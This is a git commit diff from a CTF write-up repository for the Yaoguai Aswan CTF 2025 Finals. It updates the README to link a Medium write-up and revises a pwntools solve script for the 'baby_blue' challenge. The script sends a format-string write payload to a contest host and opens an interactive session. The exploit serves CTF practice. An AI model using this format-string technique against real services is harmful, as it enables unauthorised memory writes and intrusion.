bc056ebb98cbd0dfd1bfd1a5090d14c1388aa46b
Sayed Reda <sydr38734@gmail.com>
2025-05-02 16:38:36 +0300

    Update README.md

--- README.md
+++ README.md
@@ -1,9 +1,4 @@
 # Yaoguai-Aswan-CTF-2025-Finals
 ![image](https://github.com/user-attachments/assets/f1468e46-456d-4746-a8e5-b89433b50898)
 
-Hello there, this is 0xS4Y3D 👋
-
-Alhamdullilah, I participated in Yaoguai Aswan CTF 2025 Finals and I managed to solve all pwn challenges and get a first blood in the second one
-I’d like to share my writeup for all those pwn challenges
-
-Enjooooy…
+Writeup @ <a src="https://medium.com/@sayedreda/yaoguai-aswan-ctf-2025-finals-3b9003931803">Yaoguai Aswan CTF 2025 Finals</src>
--- pwn/baby_blue/solve.py
+++ pwn/baby_blue/solve.py
@@ -4,27 +4,44 @@ from pwn import *
 
 exe = context.binary = ELF(args.EXE or './baby_blue')
 
-
+host = args.HOST or '34.65.87.36'
+port = int(args.PORT or 8083)
 
 if args.LOCAL_LIBC:
     libc = exe.libc
-else:
-    library_path = libcdb.download_libraries('./libc.so.6')
+elif args.LOCAL:
+    library_path = libcdb.download_libraries('libc.so.6')
     if library_path:
         exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
         libc = exe.libc
     else:
-        libc = ELF('./libc.so.6')
+        libc = ELF('libc.so.6')
+else:
+    libc = ELF('libc.so.6')
 
-def start(argv=[], *a, **kw):
-    '''Start the exploit against the target.'''
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
         return process([exe.path] + argv, *a, **kw)
 
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
 gdbscript = '''
-b *show_profile+101
+b *admin_panel
 continue
 '''.format(**locals())
 
@@ -32,26 +49,25 @@ continue
 
 io = start()
 
-pay1 = b"AAAAA%12$n"
-
-# Send payload to register
+pay1 = b"AAAAA%28$n"
 io.sendlineafter(b"> ", b"1")
 io.recv()
 io.sendline(pay1)
+io.recv()
 
-# Sender payload to login
-io.sendlineafter(b"> ", b"2")
+io.sendline(b"2")
 io.recv()
 io.sendline(pay1)
+io.recv()
 
-# Invoke show_profile to write
-io.sendlineafter(b"> ", b"3")
-
-# # Invoke admin_panel
-io.sendlineafter(b"> ", b"4")
-
+io.sendline(b"3")
 
 io.recv()
+
+io.sendline(b"4")
+
+io.recv()
+
 io.sendline(b"-10")
 
 io.interactive()
